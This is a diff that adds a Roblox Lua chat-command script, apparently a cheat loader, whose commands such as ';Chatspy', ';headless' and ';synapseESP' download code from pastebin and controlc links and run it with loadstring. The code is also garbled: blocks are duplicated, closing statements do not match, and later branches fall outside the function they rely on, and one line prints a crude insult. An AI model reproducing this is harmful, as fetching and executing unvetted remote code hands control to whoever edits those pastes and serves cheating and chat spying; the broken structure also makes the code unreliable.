@@ -1,0 +1,64 @@
+local Players = game:GetService("Players")
+
+Players.PlayerAdded:Connect(function(player)
+ player.Chatted:Connect(function(raw_msg)
+  local msg = raw_msg:lower()
+--Tests
+  if msg == ";test" then 
+   local char = player.Character
+   local human = char.HumanoidRootPart
+   loadstring(game:HttpGet('https://rextester.com/RMZSJ50565'))()
+  end
+ end)
+end)
+if msg == ";test" then 
+    local char = player.Character
+    local human = char.HumanoidRootPart
+    loadstring(game:HttpGet('https://rextester.com/RMZSJ50565'))()
+   end
+  end)
+ end)
+ --Basic commands
+  if msg == ";antidisplay" then 
+   local char = player.Character
+   local human = char.HumanoidRootPart
+   loadstring(game:HttpGet('https://controlc.com/c4160627'))()
+  end
+ end)
+end)
+  if msg == ";Chatspy" then 
+   local char = player.Character
+   local human = char.HumanoidRootPart
+   loadstring(game:HttpGet('https://pastebin.com/raw/yuaPqDW8'))()
+  end
+ end)
+end)
+  if msg == ";headless" then 
+   local char = player.Character
+   local human = char.HumanoidRootPart
+   print("broke ahh weird ahh bitch")
+   loadstring(game:HttpGet('https://pastebin.com/raw/uLXkrg76'))()
+  end
+ end)
+end)
+  if msg == ";synapseESP" then 
+   local char = player.Character
+   local human = char.HumanoidRootPart
+   loadstring(game:HttpGet("https://controlc.com/5991274e", true))()
+  end
+ end)
+end)
+if msg == ";reset" then 
+    local char = player.Character
+    local human = char.HumanoidRootPart
+    game.Players.LocalPlayer.Character:BreakJoints()
+   end
+  end)
+ end)
+ if msg == ";esp" then 
+    local char = player.Character
+    local human = char.HumanoidRootPart
+    loadstring(game:HttpGet("https://controlc.com/5991274e", true))()
+   end
+  end)
+ end)
